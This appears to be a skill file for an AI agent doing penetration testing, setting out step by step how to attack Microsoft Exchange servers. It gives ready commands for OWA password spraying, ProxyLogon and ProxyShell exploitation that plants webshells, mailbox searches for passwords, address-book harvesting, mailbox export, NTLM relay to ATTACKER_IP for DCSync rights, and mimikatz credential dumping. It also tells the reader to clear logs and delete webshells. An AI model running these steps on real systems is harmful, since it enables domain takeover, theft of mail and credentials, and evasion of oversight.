---
name: exchange-attack
description: "Microsoft Exchange mail server attack methodology. Use when an OWA (Outlook Web App) login page, an Exchange admin panel, Exchange running on port 443, or an Exchange server is found on the internal network. Use when a port scan finds 25/443/587/993/995 and the fingerprint is Exchange. Covers OWA password spraying, ProxyLogon (CVE-2021-26855), ProxyShell (CVE-2021-34473), ProxyNotShell (CVE-2022-41040), mailbox search and export, GAL (Global Address List) extraction, and NTLM relay to Exchange. Exchange is one of the highest-value targets in domain penetration — it can yield domain admin mailboxes, the full company address book, and SYSTEM privileges. Use this skill whenever you find any /owa /ecp /autodiscover /mapi path"
zh-signals: "针对 Microsoft Exchange 邮件服务器的攻击方法论，覆盖 OWA 密码喷洒、ProxyLogon/ProxyShell 系列漏洞与邮箱数据提取。信号:Exchange,OWA,ProxyLogon,ProxyShell,NTLM,域渗透"
when-to-use: "Use when an Exchange server, OWA/ECP login page, or the /owa, /ecp, /autodiscover, /mapi endpoints are discovered, or when ports 25/443/587/993/995 fingerprint as Exchange."
metadata:
  tags: "exchange,owa,ecp,proxylogon,proxyshell,proxynotshell,outlook,email,autodiscover,NTLM,domain penetration,CVE-2021-26855"
  category: "lateral"
---

# Exchange Mail Server Attack Methodology

Exchange holds an extremely privileged position in a domain environment — it typically has Domain Admin-level privileges, stores all company mail, and keeps the full staff address book. Compromising Exchange is almost equivalent to owning the entire domain.

## Phase 0: Discovery and Fingerprinting

### 0.1 Exchange Path Probing

```bash
# Common Exchange paths
curl -sk https://TARGET/owa           # Outlook Web App
curl -sk https://TARGET/ecp           # Exchange Control Panel (admin)
curl -sk https://TARGET/autodiscover/autodiscover.xml
curl -sk https://TARGET/mapi/nspi     # MAPI/HTTP
curl -sk https://TARGET/rpc           # RPC over HTTP
curl -sk https://TARGET/oab           # Offline Address Book
curl -sk https://TARGET/ews           # Exchange Web Services

# Version identification (extract from the OWA page or HTTP headers)
curl -sk https://TARGET/owa -D- | grep -i "x-owa-version\|x-feserver"
```

### 0.2 Version and Patch Assessment

| Build version | Exchange version | Key CVEs |
|------------|---------------|----------|
| 15.0.x | Exchange 2013 | ProxyLogon, ProxyShell |
| 15.1.x | Exchange 2016 | ProxyLogon, ProxyShell, ProxyNotShell |
| 15.2.x | Exchange 2019 | ProxyLogon, ProxyShell, ProxyNotShell |

## Phase 1: OWA Password Spraying

OWA authenticates domain credentials, so a successful login = obtaining domain user credentials.

```bash
# Use the spray tool
spray -owa2 https://TARGET/owa -u users.txt -p 'P@ssword123'

# Use MailSniper
Invoke-PasswordSprayOWA -ExchHostname TARGET -UserList users.txt -Password 'Summer2024!'

# Use ruler
ruler -k --domain TARGET --username user@domain.com --password 'Pass123' brute

# Use nxc (NetExec)
nxc owa TARGET -u users.txt -p passwords.txt --module owa

# Username sources:
# 1. GAL extraction (if you have one low-privileged account)
# 2. LinkedIn OSINT → infer the email format
# 3. /autodiscover + NTLM → obtain the domain name
```

### NTLM Information Leakage

```bash
# Extract domain information via the NTLM authentication handshake
curl -sk https://TARGET/autodiscover/autodiscover.xml -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" -D-
# Decode from the NTLM Challenge response: domain name, server name, DNS domain name
# Use ntlm_challenger.py or decode the Base64 manually

# Or use nmap
nmap -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/owa TARGET
```

## Phase 2: ProxyLogon (CVE-2021-26855 + CVE-2021-27065)

### 2.1 Vulnerability Detection

```bash
# SSRF detection
curl -sk "https://TARGET/owa/auth/x.js" \
  -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=TARGET/ecp/default.flt?~3" \
  -D-
# 200 status code + Exchange admin page content → vulnerable

# Or use an nmap script
nmap -p 443 --script http-vuln-cve2021-26855 TARGET
```

### 2.2 Exploitation

```bash
# Use the proxylogon exploit
python3 proxylogon.py -t https://TARGET -e admin@domain.com

# Steps:
# 1. SSRF to obtain the backend administrator SID
# 2. Forge an ECP session with that SID
# 3. Write a webshell through ECP (OAB VirtualDirectory)
# 4. Access the webshell to get SYSTEM privileges

# Clean up traces
# Delete the written aspx webshell
# Clear the ECP Activity log
```

## Phase 3: ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207)

```bash
# Detection — access autodiscover
curl -sk "https://TARGET/autodiscover/autodiscover.json?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com"
# 200 and JSON returned → SSRF present

# Exploitation — usually an off-the-shelf exploit
python3 proxyshell_rce.py -u https://TARGET -e admin@domain.com

# Steps:
# 1. /autodiscover SSRF → obtain LegacyDN + SID
# 2. Use the SID to get EWS access (privilege reduced to SYSTEM)
# 3. Write a webshell through PowerShell Remoting
```

## Phase 4: Mailbox Search and Data Extraction

After logging into OWA or obtaining EWS access:

### 4.1 Searching Sensitive Mail

```powershell
# Use MailSniper to search for keywords
Invoke-SelfSearch -Mailbox user@domain.com -ExchHostname TARGET \
  -Terms "password","password","VPN","key","secret","credentials"

# Use the EWS API to search
# Search for mails whose subject contains the keyword
```

### 4.2 GAL (Global Address List) Extraction

```bash
# Get all domain user mailboxes (for later password spraying/phishing)
# MailSniper
Get-GlobalAddressList -ExchHostname TARGET -UserName user@domain.com -Password 'Pass123'

# Via OAB (Offline Address Book)
curl -sk https://TARGET/oab/ --ntlm -u 'domain\user:Pass123'

# Export the user list for password spraying
```

### 4.3 Mail Export

```powershell
# Export a specific user mailbox (requires administrator privileges)
New-MailboxExportRequest -Mailbox admin@domain.com -FilePath \\exchange\c$\temp\admin.pst
# Or download message by message through EWS
```

## Phase 5: From Exchange to the Domain Controller

### 5.1 Exchange Privilege Escalation

Exchange servers are by default members of the `Exchange Windows Permissions` group, which holds WriteDACL rights on the domain:

```bash
# Use privexchange (similar approach to CVE-2019-0686/0724)
# Exchange → force authentication to the attacker → NTLM relay to LDAP → add DCSync rights to yourself
python3 privexchange.py -ah ATTACKER_IP TARGET -u user -p 'Pass123' -d domain.local

# Combine with ntlmrelayx
ntlmrelayx.py -t ldap://DC_IP --escalate-user compromised_user
```

### 5.2 Local Privilege Escalation on the Exchange Server

```bash
# Exchange servers usually run as SYSTEM
# webshell → SYSTEM privileges → dump memory/credentials
# Use mimikatz or SafetyKatz to extract credentials
# May directly obtain the domain admin NTLM hash
```

## Decision Tree

```
Exchange (OWA/ECP) discovered
├── Version identification → check ProxyLogon/ProxyShell/ProxyNotShell
│   ├── Vulnerable → RCE → SYSTEM → domain controller
│   └── Patched → continue
├── NTLM information leakage → obtain the domain name
├── OWA password spraying → obtain domain credentials
│   ├── Success → log into OWA → search sensitive mail
│   ├── Success → GAL extraction → more usernames → more spraying
│   └── Failure → try /autodiscover NTLM spraying
├── Once credentials are held → EWS/PowerShell remote management
└── High privileges → privexchange → DCSync
```
